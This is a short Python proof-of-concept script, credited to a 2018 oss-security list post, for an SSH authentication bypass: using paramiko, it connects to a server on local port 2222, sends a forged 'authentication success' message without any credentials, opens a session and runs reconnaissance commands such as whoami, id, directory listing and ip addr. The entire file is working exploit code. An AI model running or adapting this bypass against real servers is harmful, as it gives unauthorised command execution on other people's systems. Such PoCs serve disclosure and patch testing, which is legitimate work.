#!/usr/bin/python

# PoC obtained from https://www.openwall.com/lists/oss-security/2018/10/17/5

import paramiko
import socket
import sys
import time

nbytes = 4096
hostname = "127.0.0.1"
port = 2222

sock = socket.socket()
try:
     sock.connect((hostname, port))
     # instantiate transport
     m = paramiko.message.Message()
     transport = paramiko.transport.Transport(sock)
     transport.start_client()

     m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
     transport._send_message(m)

     cmd_channel = transport.open_session()
     cmd_channel.set_combine_stderr(True)
     cmd_channel.exec_command("whoami; id; ls -la /; ip addr")

except socket.error:
     print '[-] Connecting to host failed. Please check the specified host and port.'
     sys.exit(1)
